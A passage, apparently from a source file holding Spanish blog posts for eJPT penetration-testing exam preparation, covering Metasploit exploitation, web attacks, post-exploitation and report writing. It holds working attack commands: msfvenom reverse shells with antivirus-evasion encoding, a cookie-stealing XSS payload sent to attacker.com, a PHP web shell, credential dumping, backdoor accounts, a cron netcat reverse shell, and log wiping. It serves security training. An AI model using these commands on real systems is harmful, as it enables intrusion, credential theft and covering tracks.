# Útil cuando TCP está filtrado
```

### Command Shell

```bash
# Si Meterpreter no funciona, usar command shell
windows/shell/reverse_tcp

# Menos interactivo pero a veces más reliable
```

---

## Exploits Comunes en eJPT

### 1. EternalBlue (MS17-010) - Windows SMB

```bash
use exploit/windows/smb/ms17_010_eternalblue
set RHOSTS 192.168.1.100
set PAYLOAD windows/meterpreter/reverse_tcp
set LHOST 192.168.1.50
exploit

# Afecta a: Windows 7, 8, 8.1, Server 2008/2012/2016
# Detectar con Nmap: nmap --script smb-vuln-ms17-010
```

### 2. vsftpd Backdoor - FTP

```bash
use exploit/unix/ftp/vsftpd_234_backdoor
set RHOSTS 192.168.1.100
set LHOST 192.168.1.50
exploit

# Afecta a: vsftpd 2.3.2 y 2.3.3
# FTP abre backdoor en puerto 6200
```

### 3. UnrealIRCd Backdoor - IRC

```bash
use exploit/unix/irc/unreal_ircd_3281_backdoor
set RHOSTS 192.168.1.100
set LHOST 192.168.1.50
exploit

# Afecta a: Unreal IRCd 3.2.8.1
```

### 4. Apache mod_ssl - OpenSSL

```bash
use exploit/unix/http/apache_mod_ssl_openssl_bof
set RHOSTS 192.168.1.100
set LHOST 192.168.1.50
exploit

# Afecta a: Apache < 1.3.27
# OpenSSL < 0.9.6e
```

---

## Msfvenom: Generador de Payloads Independiente

A veces necesitas un payload fuera de Metasploit.

### Syntax Básica

```bash
msfvenom -p [PAYLOAD] -f [FORMAT] LHOST=[IP] LPORT=[PORT]
```

### Generar un Reverse Shell Ejecutable

```bash
# Windows reverse shell (exe)
msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.50 LPORT=4444 -f exe > shell.exe

# Linux reverse shell (elf)
msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=192.168.1.50 LPORT=4444 -f elf > shell

# Con encoding (evasión antivirus)
msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.50 LPORT=4444 -e x86/shikata_ga_nai -i 5 -f exe > shell.exe
# -e = encoder
# -i = iteraciones
```

### Formatos Disponibles

| Formato | Tipo | Extensión |
|---------|------|-----------|
| exe | Windows ejecutable | .exe |
| elf | Linux ejecutable | (sin ext) |
| asp | Web script | .asp |
| aspx | Web script | .aspx |
| php | Web script | .php |
| raw | Raw bytes | (bin) |
| c | C source | .c |
| bash | Bash script | .sh |

---

## Manejo de Sesiones

### Listar Sesiones Abiertas

```bash
# En msfconsole
sessions

# Output:
# Id  Type                   Information           Connection
# --  ----                   -----------           ----------
# 1   meterpreter windows -> DOMAIN\\USER           192.168.1.50:4444
# 2   meterpreter windows -> NT AUTHORITY\\SYSTEM   192.168.1.50:4444
```

### Interactuar con Sesión

```bash
# Entrar a una sesión específica
sessions -i 1

# Ahora estás en meterpreter interactivo
meterpreter > sysinfo

# Volver a msfconsole
background
```

### Escribir script en Metasploit

```bash
# Crear archivo: script.rc
echo "use exploit/windows/smb/ms17_010_eternalblue" > script.rc
echo "set RHOSTS 192.168.1.0/24" >> script.rc
echo "set PAYLOAD windows/meterpreter/reverse_tcp" >> script.rc
echo "set LHOST 192.168.1.50" >> script.rc
echo "exploit -j" >> script.rc

# Ejecutar script
msfconsole -r script.rc
```

---

## Troubleshooting Común

### Problema: "Handler died" - Conexión rechazada

**Causa:** Firewall bloqueando puerto de escucha

**Solución:**
```bash
# Usar puerto diferente
set LPORT 8888

# O firewall forward
sudo iptables -I INPUT -p tcp --dport 4444 -j ACCEPT
```

### Problema: Exploit falla silenciosamente

**Causa:** LHOST incorrecto

**Solución:**
```bash
# Verificar tu IP
ifconfig

# En eJPT, siempre usar IP de VPN
set LHOST [tu_vpn_ip]
```

### Problema: Antivirus detecta payload

**Solución:** Usar encoding
```bash
set ENCODER x86/shikata_ga_nai
exploit
```

---

## Checklist de Explotación Metasploit

- [ ] Identificar servicio/versión vulnerable con Nmap
- [ ] Buscar exploit en msfconsole
- [ ] Configurar RHOSTS (target)
- [ ] Configurar LHOST/LPORT (tu Kali)
- [ ] Seleccionar PAYLOAD apropiado
- [ ] Check options antes de exploit
- [ ] Ejecutar y esperar conexión
- [ ] En Meterpreter: sysinfo, getuid, getsystem
- [ ] Documentar credenciales/información encontrada
"""

# ─── Post 5: Ataques Web ──────────────────────────────────────────────────────

ATAQUES_WEB_CONTENT = """# Ataques a Aplicaciones Web: SQLi, XSS y más

## Introducción a Pentesting Web

La mayoría de vulnerabilidades modernas son en aplicaciones web. En eJPT, espera encontrar:

1. SQL Injection
2. Weak Authentication
3. Directory Traversal
4. Cross-Site Scripting (XSS)
5. File Upload vulnerabilidades
6. Misconfigurations

---

## Burp Suite Community - Tu Arma Principal

### Instalación y Setup

```bash
# En Kali Linux
apt install burpsuite

# Ejecutar
burpsuite &
```

### Configuración de Proxy

1. **Burp Suite → Proxy → Options → Listeners**
   - Bind to address: 127.0.0.1
   - Port: 8080
   - Running: ON

2. **Firefox → Settings → Network → Manual Proxy**
   - HTTP Proxy: 127.0.0.1
   - Port: 8080

3. **Ahora todo tráfico HTTP pasa por Burp**

### Principales Tabs en Burp

| Tab | Función |
|-----|---------|
| Proxy | Intercepta tráfico en tiempo real |
| Repeater | Edita y reenvia requests |
| Intruder | Ataque de fuerza bruta parametrizado |
| Scanner | Escaneo automático de vulnerabilidades |
| Decoder | Decodifica/codifica datos |

---

## SQL Injection - Hack de Bases de Datos

### Concepto Básico

```sql
-- Login vulnerable a SQL injection
SELECT * FROM users WHERE username='admin' AND password='pass'

-- Si el formulario NO valida entrada, puedo inyectar:
Username: admin' --
Password: (cualquiera)

-- El SQL resultante:
SELECT * FROM users WHERE username='admin' -- ' AND password=''

-- El comentario (--) elimina el resto de la query
-- Acceso sin saber contraseña!
```

### Detección Manual de SQLi

```bash
# En formulario login:
Username: admin' (comilla simple)

# Errores SQL = vulnerable
# Error: Syntax Error in SQL statement

# O intenta:
Username: admin' OR '1'='1
# Si carga dashboard = SQLi probable

# O:
Username: admin' OR '1'='1' --
```

### SQLMap - Automático

```bash
# Contra formulario login
sqlmap -u "http://192.168.1.100/login.php" --data="user=admin&pass=test" -p user

# -u = URL
# --data = parámetros POST
# -p = parámetro a testear

# Output:
# [*] Testing 'UNION ALL SELECT NULL,NULL,...'
# Parameter 'user' is vulnerable to time-based blind SQLi

# Una vez detectada, extraer datos:
sqlmap -u "http://192.168.1.100/login.php" --data="user=admin&pass=test" --dbs

# Listar tablas:
sqlmap --dbs -D database_name --tables

# Extraer datos:
sqlmap --dbs -D database_name -T users --dump
```

### SQLi en URL

```bash
# SQL injection en parámetro GET
http://192.168.1.100/product.php?id=1

# Testear:
http://192.168.1.100/product.php?id=1'
# Si error SQL = vulnerable

# UNION injection
http://192.168.1.100/product.php?id=1 UNION SELECT 1,2,3,4,5--

# Descubrir número de columnas:
# Si 5 columnas: no error
# Si 6 columnas: error → 5 es correcto

# Encontrar tabla de usuarios:
http://192.168.1.100/product.php?id=1 UNION SELECT 1,2,username,4,password FROM users--
```

---

## Cross-Site Scripting (XSS)

### Tipos de XSS

#### 1. Reflected XSS (URL)

```html
<!-- URL vulnerable: -->
http://192.168.1.100/search.php?q=<script>alert('XSS')</script>

<!-- Si la entrada NO está sanitizada:
- La víctima hace click en link
- El JavaScript se ejecuta en su navegador
- Robar cookies, sesiones, datos
-->
```

**Payload típico:**
```javascript
<script>
new Image().src='http://attacker.com/log.php?c='+document.cookie;
</script>

<!-- Roba cookies y las envía al atacante -->
```

#### 2. Stored XSS (Persistente)

```html
<!-- Comentario vulnerable en blog: -->
<script>alert('Stored XSS')</script>

<!-- Si se guarda en BD sin sanitizar:
- TODOS los visitantes ejecutan el script
- Más peligroso que reflected
-->
```

#### 3. DOM-based XSS

```javascript
// JavaScript que usa entrada sin validar
var userInput = document.location.hash.substring(1);
document.getElementById('content').innerHTML = userInput;

// Si visitante: hash?<script>alert(1)</script>
// El script se ejecuta
```

### Detección y Explotación

```bash
# En formulario, probar:
<script>alert(1)</script>

# O más sigiloso (para WAF bypass):
<img src=x onerror="alert(1)">
<svg/onload="alert(1)">
<iframe src="javascript:alert(1)">

# Si el payload aparece sin escapar en la respuesta
# = Vulnerable a XSS
```

### En Burp Suite

1. En Repeater, inyectar payload en parámetro
2. Enviar request
3. Revisar respuesta:
   - Si payload aparece sin encoding = XSS
   - Si aparece encoded = protegido

---

## Directory Traversal (Path Traversal)

### Concepto

```
Aplicación intenta leer: /app/uploads/user_file.txt
Pero si entrada NO está validada:

URL: /file.php?path=../../../../etc/passwd

Código vulnerable:
$file = "/app/uploads/" . $_GET['path'];
readfile($file);

Resultado: Lee /etc/passwd (fuera del directorio permitido)
```

### Explotación Manual

```bash
# Testear:
http://192.168.1.100/file.php?path=../../../../etc/passwd

# En Windows:
http://192.168.1.100/file.php?path=....\\....\\windows\\win.ini

# Variaciones (bypass):
..%2f..%2f..%2fetc%2fpasswd
....%252f....%252fetc%252fpasswd

# Si ves contenido de archivos del sistema
# = Directory traversal vulnerable
```

### Información valiosa a leer

- `/etc/passwd` - Usuarios del sistema
- `/etc/shadow` - Hashes de contraseñas
- `web.config` (Windows) - Configuración IIS
- `web.xml` (Java) - Configuración Java
- `.env` - Variables de entorno (credenciales BD)

---

## File Upload - Cargar Shell

### Flujo de Ataque

1. Aplicación permite subir archivos
2. No valida tipo (cualquier archivo se sube)
3. Se sube a directorio web-accessible
4. Acceder a archivo = ejecutar código

### Ejemplo en PHP

```php
<!-- upload.php vulnerable -->
<?php
move_uploaded_file($_FILES['file']['tmp_name'], 'uploads/'.$_FILES['file']['name']);
?>

<!-- Sin validación: subo shell.php -->
```

### Generar Shell PHP

```php
<?php system($_GET['cmd']); ?>

<!-- Guardo como shell.php
Subo a aplicación
Accedo a: http://192.168.1.100/uploads/shell.php?cmd=id

Resultado:
uid=33(www-data) gid=33(www-data) groups=33(www-data)
-->
```

### Bypass de Validaciones

```bash
# Si rechaza .php, intentar:
shell.php.jpg
shell.php%00.jpg  # Null byte injection
shell.phtml
shell.php7

# Si rechaza por contenido MIME:
En Burp → Repeater → Cambiar Content-Type
Content-Type: image/jpeg

# El servidor puede aceptar pensando es imagen
```

---

## Authentication Bypass

### SQL Injection en Login

```html
<!-- Ya cubierto arriba -->
Username: admin' OR '1'='1' --
Password: anything
<!-- Acceso sin contraseña -->
```

### Default Credentials

```
admin / admin
admin / 12345
admin / password
admin / admin123
root / root
test / test
guest / guest
```

**En eJPT:** Siempre intentar defaults primero.

### Cookie Manipulation

```bash
# En Burp Suite Repeater:
# Intercepta login exitoso
# Copia el cookie de sesión: sessionid=abc123def456

# Edita manualmente:
# sessionid=1 → sessionid=admin
# Si es secuencial sin validación:
# sessionid=1 puede ser user, 2 puede ser admin
```

---

## DVWA - Entrenamiento Práctico

DVWA (Damn Vulnerable Web Application) es perfecta para eJPT:

```bash
# Instalar DVWA
git clone https://github.com/digininja/DVWA
cd DVWA
# Configurar config/config.inc.php
# Acceder a http://localhost/DVWA

# Vulnerabilidades disponibles:
# - SQL Injection
# - XSS (Reflected/Stored)
# - Authentication Bypass
# - File Inclusion
# - File Upload
# - CSRF
```

---

## HTTP Headers de Seguridad

Cabeceras que protegen o revelan información:

```
Content-Type: text/html; charset=utf-8
│ └─ Tipo MIME

Server: Apache/2.4.6
│ └─ Información de servidor (potencial leak)

X-Powered-By: PHP/7.4.3
│ └─ Tecnología backend (leak)

X-Frame-Options: SAMEORIGIN
│ └─ Protección clickjacking

Content-Security-Policy: ...
│ └─ Protección XSS

Strict-Transport-Security: max-age=31536000
│ └─ Fuerza HTTPS

X-Content-Type-Options: nosniff
│ └─ Previene MIME sniffing
```

---

## Checklist de Pentesting Web

- [ ] Identificar tecnología (servidor, lenguaje, frameworks)
- [ ] Mapear toda la aplicación con Burp Spider
- [ ] Probar cada input contra SQL injection
- [ ] Probar cada input contra XSS
- [ ] Enumerar directorios/archivos ocultos (Gobuster)
- [ ] Probar default credentials
- [ ] Buscar directory traversal en file-related functions
- [ ] Probar file upload con múltiples extensiones
- [ ] Revisar cookies y tokens de sesión
- [ ] Buscar información en comentarios HTML
- [ ] Testear métodos HTTP alternativos (PUT, DELETE, TRACE)
"""

# ─── Post 6: Post-Explotación y Pivoting ──────────────────────────────────────

POST_EXPLOTACION_CONTENT = """# Post-Explotación: Meterpreter, Pivoting y Persistencia

## Una vez dentro: Ganar inteligencia del sistema

Después de comprometer una máquina con Meterpreter, necesitas:
1. Entender qué tienes
2. Escalar privilegios
3. Extraer credenciales
4. Encontrar datos valiosos
5. Usar máquina para atacar el resto de red

---

## Comandos Esenciales de Meterpreter

### Información del Sistema

```bash
meterpreter > sysinfo
# Output:
# Computer        : DESKTOP-ABC123
# OS              : Windows 10 (10.0 Build 19041)
# Architecture    : x64
# System Language : en_US
# Logged On Users : 2

meterpreter > getuid
# Server username: DOMAIN\\Administrator

meterpreter > whoami
# DOMAIN\\Administrator

meterpreter > getpid
# Current pid: 4352
```

### Información de Red

```bash
meterpreter > ipconfig
# Interface  1
# Name       : Loopback
# IP address : 127.0.0.1

# Interface  2
# Name       : Ethernet0
# IP address : 192.168.1.100
# Netmask    : 255.255.255.0
# Gateway    : 192.168.1.1
```

### Procesos

```bash
meterpreter > ps
# PID    PPID   Name            Arch  Session  User
# ---    ----   ----            ----  -------  ----
# 1234   1000   svchost.exe     x64   0        NT AUTHORITY\\SYSTEM
# 2345   1200   explorer.exe    x64   1        DOMAIN\\user
# 3456   1000   lsass.exe       x64   0        NT AUTHORITY\\SYSTEM

# Migrar a proceso con mejor privileg:
meterpreter > migrate 1234
# [*] Migrating from 2345 to 1234
```

### Archivos del Sistema

```bash
meterpreter > ls
# Mode     Size  Type  Last modified              Name
# ----     ----  ----  --------- -----            ----
# 100666   1024  fil   2024-01-15 10:00:00 -0500  file.txt
# 40777    4096  dir   2024-01-15 10:00:00 -0500  Desktop

meterpreter > cat C:\\Users\\User\\AppData\\Roaming\\credentials.txt
# Username: admin
# Password: SecurePass123

meterpreter > download C:\\Users\\User\\AppData\\Roaming\\credentials.txt /tmp/creds.txt
# [*] Downloading: C:\\Users\\User\\AppData\\Roaming\\credentials.txt -> /tmp/creds.txt
# [*] Downloaded 512.00 B of 512.00 B
```

---

## Privilege Escalation

### Enumeración de Privilegios Actuales

```bash
meterpreter > getsystem
# ...got system (via technique 1).
# System: Windows 10

# Si fallan automático, enumeración manual:
```

### Técnicas de Escalada en Windows

#### 1. UAC Bypass (si el usuario es admin pero UAC está activo)

```bash
meterpreter > use incognito
meterpreter > list_tokens -u
# Delegation Tokens Available
# ================================
# DOMAIN\\Administrator

meterpreter > impersonate_token DOMAIN\\Administrator
```

#### 2. Kernel Exploit

```bash
# En msfconsole, buscar kernel exploits:
search type:exploit kernel

# Ejemplo: CVE-2021-1732 (Win10 Local Privilege Escalation)
use exploit/windows/local/cve_2021_1732_privilege_escalation
set SESSION 1  # Tu sesión meterpreter
run

# Escalada exitosa = nuevo SYSTEM shell
```

#### 3. Weak File Permissions

```bash
meterpreter > shell
# Acceso a cmd
C:\> icacls "C:\\Program Files\\Vulnerable App"
# Verificar si usuario actual puede escribir

# Si sí: reemplazar executable vulnerable
# Próxima vez que se ejecute: código malicioso
```

### Técnicas en Linux

#### 1. SUID Binaries

```bash
meterpreter > shell
$ find / -perm -4000 2>/dev/null
# /usr/bin/passwd
# /usr/bin/sudo
# /usr/local/bin/custom_binary  <- Potencialmente vulnerable

# Si custom_binary es SUID root y tiene vulnerabilidad:
./custom_binary [exploit]
# Ganas acceso como root
```

#### 2. Sudo Sin Contraseña

```bash
$ sudo -l
# User can run the following commands without password:
# (root) NOPASSWD: /usr/bin/find

# Explotar find:
sudo find / -exec /bin/sh \; -quit
# Shell como root
```

#### 3. Kernel Exploit

```bash
meterpreter > shell
$ uname -r
# 4.15.0-1021-aws

# Buscar exploit local:
searchsploit 4.15.0
# CVE-2018-17666 Ubuntu/Debian

# En eJPT: A menudo hay kernel exploits disponibles
# Compilar en máquina comprometida
# Ejecutar
# Root shell
```

---

## Extracción de Credenciales

### Windows: SAM Hash Dump

```bash
meterpreter > hashdump
# Administrator:500:aad3b435b51404eeaad3b435b51404ee:a62f1f79eb2d0f5d272e94d64bb0f9ab:::
# Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
# User:1001:aad3b435b51404eeaad3b435b51404ee:5f4dcc3b5aa765d61d8327deb882cf99:::

# Formato: Username:RID:LM_Hash:NTLM_Hash

# En tu máquina atacante:
# Crack con John/Hashcat
john hashes.txt --wordlist=/usr/share/wordlists/rockyou.txt
hashcat -m 1000 hashes.txt rockyou.txt
```

### Windows: Cached Credentials

```bash
meterpreter > use kiwi
meterpreter > creds_all

# Output: Passwords, tickets, tokens
# A menudo credenciales claras de usuarios
```

### Linux: /etc/passwd y /etc/shadow

```bash
meterpreter > shell
$ cat /etc/passwd
# root:x:0:0:root:/root:/bin/bash
# user:x:1000:1000:User:/home/user:/bin/bash

$ cat /etc/shadow  # Si eres root
# root:$6$rounds=656000$salt$hash
# user:$6$rounds=656000$salt$hash

# Extraer hashes y crackear en tu máquina
john shadow --wordlist=rockyou.txt
```

---

## Pivoting: Atacar Red Interna

Después de comprometer una máquina, úsala como puente para atacar otras.

### Técnica 1: Ruta estática en Metasploit

```bash
# En msfconsole, con sesión abierta:
route add 10.0.0.0 255.255.255.0 1
# 1 = número de sesión

# Ahora puedes hacer scans contra 10.0.0.0/24
use auxiliary/scanner/nmap/nmap
set RHOSTS 10.0.0.0/24
run

# Encuentra servicio vulnerable en 10.0.0.50
# Exploit ese servicio pasando por máquina comprometida
```

### Técnica 2: SOCKS Proxy

```bash
# En msfconsole:
use auxiliary/server/socks4a
run

# [*] Metasploit SOCKS4a server started
# [*] Listening on 127.0.0.1:1080

# En terminal, configurar proxychains:
# /etc/proxychains.conf
socks4 127.0.0.1 1080

# Ahora todos los comandos van por proxy:
proxychains nmap -sV 10.0.0.0/24
proxychains curl http://10.0.0.50
proxychains searchsploit
```

### Técnica 3: SSH Tunneling

```bash
# Después de ganar SSH access:
ssh -L 8080:10.0.0.50:80 user@compromised_machine

# Ahora http://localhost:8080 lleva a http://10.0.0.50:80
# Útil para explotar web apps en red interna
```

---

## Persistencia: Manteniendo Acceso

### Windows: Crear Usuario Backdoor

```bash
meterpreter > shell
C:\> net user backdoor SecurePass123 /add
# Crear usuario

C:\> net localgroup administrators backdoor /add
# Agregar a grupo admin

C:\> net group "Domain Admins" backdoor /add
# Si en dominio
```

Ahora tienes acceso permanente con SSH/RDP.

### Windows: Scheduled Task

```bash
meterpreter > shell
C:\> schtasks /create /tn "Windows Update" /tr C:\\malware.exe /sc MINUTE /mo 5
# Ejecutar cada 5 minutos

# Víctima no lo nota (es nombrado "Windows Update")
```

### Linux: SSH Key Persistence

```bash
meterpreter > shell
$ mkdir -p ~/.ssh
$ echo "ssh-rsa AAAA...your_public_key..." >> ~/.ssh/authorized_keys
$ chmod 700 ~/.ssh
$ chmod 600 ~/.ssh/authorized_keys

# Ahora acceso permanente con SSH:
ssh -i private_key user@target
```

### Linux: Cron Job

```bash
# En máquina comprometida:
$ echo "* * * * * nc 192.168.1.50 4444 -e /bin/bash" | crontab -
# Reverse shell cada minuto

# O agregar a /etc/cron.d/malicious
```

---

## Covering Tracks: Borrar Evidencia

**Nota:** En eJPT no es requerido, pero en pentests reales es crítico.

### Windows: Limpiar Event Logs

```bash
meterpreter > shell
C:\> wevtutil cl System
C:\> wevtutil cl Security
C:\> wevtutil cl Application

# Elimina logs de eventos
```

### Linux: Limpiar Logs

```bash
$ history -c  # Limpiar historial actual

$ echo "" > /var/log/auth.log
$ echo "" > /var/log/syslog
$ echo "" > /home/user/.bash_history

# O:
$ shred -vfz -n 10 /var/log/auth.log  # Sobrescribir 10 veces
```

### Metasploit: Timestomp (cambiar fecha de archivo)

```bash
meterpreter > timestomp C:\\malware.exe -m "01/01/2020 00:00:00"
# Simular que el archivo es antiguo
```

---

## Tabla de Herramientas Post-Explotación

| Herramienta | Objetivo | Comando |
|---|---|---|
| **Hashdump** | Extraer SAM | `hashdump` |
| **Kiwi** | Credenciales Windows | `load kiwi`, `creds_all` |
| **GetSystem** | UAC Bypass | `getsystem` |
| **Persistence** | Backdoor | `run persistence` |
| **Timestomp** | Ocultar evidencia | `timestomp file -m date` |
| **Migrate** | Cambiar proceso | `migrate PID` |

---

## Checklist Post-Explotación

- [ ] Ganar Meterpreter shell
- [ ] `sysinfo` - Entender sistema
- [ ] `ipconfig` - Conocer red interna
- [ ] `ps` - Procesos activos
- [ ] `hashdump` / `creds_all` - Extraer credenciales
- [ ] `getsystem` - Escalar a SYSTEM/root
- [ ] Enumerar red interna (SOCKS4a)
- [ ] Encontrar servicio vulnerable en red interna
- [ ] Explotar servicio
- [ ] Establecer persistencia (usuario backdoor, SSH key, cron)
- [ ] Documentar TODO para reporte
"""

# ─── Post 7: Reporte y Preparación Examen ──────────────────────────────────────

REPORTE_EXAMEN_CONTENT = """# Informe de Pentesting Profesional y Preparación al Examen

## Estructura de Reporte Profesional

Un buen reporte es tan importante como encontrar vulnerabilidades.

```
ÍNDICE DEL REPORTE
├─ Portada (Título, Fecha, Testers, Confidencial)
├─ Resumen Ejecutivo (1 página, sin detalles técnicos)
├─ Hallazgos Técnicos
│  ├─ Críticos
│  ├─ Altos
│  ├─ Medios
│  └─ Bajos
├─ Recomendaciones
├─ Apéndice (evidencia, screenshots, logs)
└─ Anexo de Herramientas Usadas
```

---

## Sección 1: Portada

```
═══════════════════════════════════════════
    INFORME DE PENETRATION TESTING
═══════════════════════════════════════════

Objetivo: [Nombre empresa/red]
Fecha: 15 de Marzo, 2024
Duración: 4 horas
Testers: John Doe (eJPT Certified)
Clasificación: CONFIDENCIAL

═══════════════════════════════════════════
```

---

## Sección 2: Resumen Ejecutivo

**Máximo 1 página, sin jargon técnico.**

```
RESUMEN EJECUTIVO

Se realizó un test de penetración sobre la red objetivo durante 4 horas.
Se identificaron CRÍTICOS = 2 vulnerabilidades de severidad crítica.

En total: 8 vulnerabilidades encontradas.

RIESGOS PRINCIPALES:
1. SQL Injection en formulario de login - permite acceso sin credenciales
2. Escalada de privilegios a través de archivo SUID mal configurado

RECOMENDACIÓN INMEDIATA:
Parchar vulnerabilidades críticas dentro de 48 horas.

RIESGOS COMERCIALES:
- Acceso no autorizado a datos de cliente
- Cumplimiento normativo (RGPD) en riesgo
- Reputación afectada si datos se pierden

Invertir en remediation es ROI positivo.
```

---

## Sección 3: Hallazgos Técnicos

### Formato Estándar por Vulnerabilidad

```
HALLAZGO #1: SQL Injection en Login
SEVERIDAD: CRÍTICA (CVSS 9.8)
Componente: /login.php
Detalles: El parámetro "username" no está sanitizado.
          Un atacante puede bypassar autenticación.

PRUEBA:
  Username: admin' OR '1'='1' --
  Password: (cualquier cosa)
  Resultado: Acceso como admin sin contraseña

IMPACTO:
  - Acceso a sistema como usuario admin
  - Acceso a todos los datos de usuario
  - Posible ejecución de comandos

REMEDIACIÓN:
  - Usar prepared statements en BD
  - Input validation en frontend y backend
  - WAF para detectar patrones SQL injection

REFERENCIAS:
  - OWASP Top 10 2021: A03 - Injection
  - CWE-89: SQL Injection
```

---

## CVSS Score (Severity Rating)

Escala de 0-10 para cuantificar severidad.

```
CVSS v3.1 Metrics

Attack Vector (AV):
  L = Local (Acceso físico)
  A = Adjacent (Misma red)
  N = Network (Internet)

Attack Complexity (AC):
  H = High (Requiere mucho setup)
  L = Low (Trivial de explotar)

Privileges Required (PR):
  H = High (Admin)
  L = Low (Usuario normal)
  N = None (Sin autenticación)

Confidentiality (C):
  N = None
  L = Low (Algunos datos)
  H = High (Todos datos)

Integrity (I):
  N/L/H (Modificar datos)

Availability (A):
  N/L/H (Servicio caído)

FÓRMULA: Complejidad + Impacto

Ejemplos:
  CVSS 9.8 = Network / Low complexity / No auth = MUY CRÍTICA
  CVSS 5.3 = Network / High complexity / High auth = MEDIA
  CVSS 3.1 = Low impact, no auth needed = BAJA
```

---

## Evidencia en el Reporte

**Siempre incluir:**

```
HALLAZGO: SQL Injection Login

[SCREENSHOT 1: Formulario de login original]
[SCREENSHOT 2: Ingreso de payload: admin' OR '1'='1' --]
[SCREENSHOT 3: Acceso exitoso como admin]
[SCREENSHOT 4: Dashboard del admin con usuarios expuestos]

LOGS DE TRÁFICO (Burp/Wireshark):
POST /login.php HTTP/1.1
Host: 192.168.1.100
Content-Type: application/x-www-form-urlencoded

user=admin' OR '1'='1' -- &pass=test

RESPUESTA:
HTTP/1.1 200 OK
Set-Cookie: sessionid=abc123def456
...
<h1>Welcome Admin</h1>
```

---

## Sección 4: Recomendaciones

```
RECOMENDACIONES (Prioridad)

1. INMEDIATO (24-48 horas):
   □ Parchar SQL Injection (input validation + prepared statements)
   □ Remover usuario de escalada de privilegios no autorizado
   □ Cambiar contraseñas de admin encontradas
   □ Revisar logs de acceso por actividad maliciosa

2. CORTO PLAZO (1-2 semanas):
   □ Implementar WAF (Web Application Firewall)
   □ Auditar otros formularios contra SQL injection
   □ Test de seguridad de APIs
   □ Capacitación de desarrolladores en OWASP Top 10

3. MEDIANO PLAZO (1-3 meses):
   □ Implementar SIEM para monitoreo continuo
   □ Automatizar pruebas de seguridad en CI/CD
   □ Code review de aplicaciones críticas
   □ Evaluación de seguridad de terceros (vendors)

4. LARGO PLAZO (Continuo):
   □ Programa de bug bounty
   □ Pruebas de penetración semestrales
   □ Actualizaciones de frameworks/dependencias
   □ Monitoreo de amenazas en dark web
```

---

## eJPT Examen: Dinámica Específica

### Estructura del Examen

```
MÁQUINA 1: Acceso inicial
├─ Objetivo: Ganar reverse shell
├─ Dificultad: Fácil/Medio
└─ Tiempo estimado: 30-45 min

MÁQUINA 2: Escalada de privilegios
├─ Objetivo: Root/SYSTEM
├─ Dificultad: Medio
└─ Tiempo estimado: 30-45 min

MÁQUINA 3: Aplicación web vulnerable
├─ Objetivo: Acceso/Exfiltración de datos
├─ Dificultad: Medio/Alto
└─ Tiempo estimado: 45-60 min

MÁQUINA 4: Reto combinado
├─ Objetivo: Múltiples pasos, pivoting
├─ Dificultad: Alto
└─ Tiempo estimado: 60-75 min
```

---

## Consejos de Tiempo en Examen

```
MINUTO 0-15: SETUP
├─ Verificar conectividad VPN
├─ Confirmar acceso a máquinas
├─ Abrir terminal, Burp, Wireshark
├─ Tomar screenshot de inicio

MINUTO 15-30: RECONOCIMIENTO
├─ Nmap de todas las máquinas
├─ Identificar servicios abiertos
├─ Listar puertos y versiones

MINUTO 30-90: MÁQUINA 1
├─ Enumeración detallada
├─ Explotación (SQL injection, weak creds, etc.)
├─ Ganar shell/acceso
├─ Escalar si es necesario

MINUTO 90-150: MÁQUINA 2 y 3
├─ Aplicar conocimiento de máquina 1
├─ Búsqueda rápida de vectores
├─ Explotación

MINUTO 150-230: MÁQUINA 4 + Documentación
├─ Máquina más difícil
├─ Recopilación de evidence (screenshots)
├─ Anotar flags/hashes/información

MINUTO 230-240: ÚLTIMOS DETALLES
├─ Verificar que tengo evidencia de 4 máquinas
├─ Revisar notas
├─ Preparar informe básico
```

---

## Errores Comunes a EVITAR

### ❌ Error 1: Atascarse en una máquina

**Problema:** Pasar 90 minutos en Máquina 1
**Solución:** Máximo 45 min. Si no avanzas → salta a otra

### ❌ Error 2: No tomar screenshots

**Problema:** "Accedí pero no tengo proof"
**Solución:** Screenshot de CADA hito:
- Shell obtenido (id/whoami output)
- Flag encontrada
- Credenciales descubiertas

### ❌ Error 3: No enumerar bien

**Problema:** Perder vulnerabilidades obvias
**Solución:** Nmap siempre. Enumeración es 50% del trabajo.

### ❌ Error 4: Perder el contexto de red

**Problema:** Máquina 1 es puente, no sé cómo pivotar
**Solución:** Después de acceso → ifconfig → ruta a siguiente red

### ❌ Error 5: No documentar

**Problema:** Olvidar credenciales encontradas, hashes
**Solución:** Archivo de texto siempre abierto:
```
=== HALLAZGOS ===
Máquina 1 (192.168.1.100):
  - Usuario: admin
  - Pass: SecurePass123
  - Flag: eJPT{xxxxx}

Máquina 2 (10.0.0.50):
  - [...]
```

---

## Recursos de Estudio Recomendados

### Plataformas Prácticas

| Plataforma | Nivel | Costo | Máquinas tipo eJPT |
|---|---|---|---|
| **TryHackMe** | Beginner-Intermediate | Gratis/Premium | Muchas con guías |
| **HackTheBox Startingpoint** | Beginner | Gratis | 8-10 máquinas Tier 0-1 |
| **PentesterLab** | Intermediate | Pagado | Ejercicios enfocados en eJPT |
| **eJPT Official Labs** | Intermediate | Incluido en curso | Máquinas reales del examen |

### Salas TryHackMe Recomendadas

1. **Introductory:**
   - Linux Fundamentals
   - Windows Fundamentals
   - Networking Basics

2. **Scanning & Enumeration:**
   - Nmap
   - Hydra
   - Metasploit Exploitation

3. **Web & Applications:**
   - OWASP Top 10
   - DVWA
   - PortSwigger Web Security

4. **Privilege Escalation:**
   - Privilege Escalation (Linux)
   - Privilege Escalation (Windows)

5. **Full Walkthroughs:**
   - Kenobi (SMB enumeration)
   - Tomghost (Tomcat)
   - Blaster (EternalBlue)

---

## Día del Examen: Checklist Final

- [ ] Dormir 8 horas mínimo
- [ ] Desayuno completo (proteínas + carbohidratos)
- [ ] Entorno silencioso
- [ ] Webcam limpia y posicionada
- [ ] Conexión Ethernet (no WiFi)
- [ ] Kali Linux actualizado
- [ ] Herramientas principales testadas
- [ ] VPN conectada 5 minutos antes
- [ ] Micrófono y cámara funcionando
- [ ] Documentos de ID a mano (proctoring requerirá)
- [ ] Cuaderno/bolígrafo para notas
- [ ] Atajos de teclado Burp memorizados
- [ ] Wordlists precargadas (rockyou.txt, dirbuster)
- [ ] Respirar profundo, relajarse

---

## Después del Examen

### En los 10 días siguientes:

```
1. Esperar email de resultados
2. Si APROBADO:
   - Verificar certificación en portal eLearnSecurity
   - Descargar PDF del certificado
